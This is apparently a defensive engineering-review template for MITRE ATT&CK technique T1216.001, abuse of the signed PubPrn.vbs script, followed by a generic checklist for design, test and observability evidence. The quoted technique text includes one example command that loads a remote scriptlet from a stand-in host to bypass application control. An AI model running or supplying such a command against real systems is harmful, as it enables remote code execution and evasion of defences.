# PubPrn Technique Engineering Review

## Reference

- Technique: **T1216.001 — PubPrn**

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via Cscript.exe. For example, the following code publishes a printer within the specified domain: cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second script: parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), PubPrn.vbs has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to LDAP://, vice the script: moniker which could be used to reference remote code via HTTP(S).

## Engineering review

1. Identify the engineering boundary where the technique would apply: the component, the service, or the deployment.
2. Review the design decision that would prevent the technique, and record the alternative considered.
3. Review the implementation evidence for the preventive control.
4. Review the test coverage that would fail if the control regressed.
5. Review the observability: which signal would show the control is not operating.
6. Record the residual risk where prevention is not achievable, and the detection that compensates.

## Review evidence

- the design record for the preventive decision;
- the implementation or configuration evidence;
- the test record showing the control is exercised;
- the observability mapping.

## Limitations

An engineering review describes what the design and the implementation evidence show. It does not claim the technique has been addressed in production.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1216.001: https://attack.mitre.org/techniques/T1216/001
- Reviewed: 2026-10-27
